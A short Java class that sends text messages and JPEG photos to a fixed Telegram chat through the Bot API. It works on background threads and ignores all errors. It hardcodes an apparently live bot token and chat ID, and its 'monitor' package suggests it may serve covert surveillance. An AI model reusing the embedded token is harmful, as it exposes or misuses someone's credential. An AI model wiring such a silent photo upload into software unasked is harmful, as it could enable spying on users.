package com.tom5.monitor;

import okhttp3.*;
import java.io.File;

public class TelegramSender {
    private static final String TOKEN = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";

    public static void sendMessage(String msg) {
        new Thread(() -> {
            OkHttpClient c = new OkHttpClient();
            RequestBody b = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", msg).build();
            try { c.newCall(new Request.Builder().url(BASE_URL + "sendMessage").post(b).build()).execute().close(); } catch (Exception ignored) {}
        }).start();
    }

    public static void sendPhoto(File f) {
        new Thread(() -> {
            OkHttpClient c = new OkHttpClient();
            RequestBody b = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "img.jpg", RequestBody.create(MediaType.parse("image/jpeg"), f)).build();
            try { c.newCall(new Request.Builder().url(BASE_URL + "sendPhoto").post(b).build()).execute().close(); } catch (Exception ignored) {}
        }).start();
    }
}
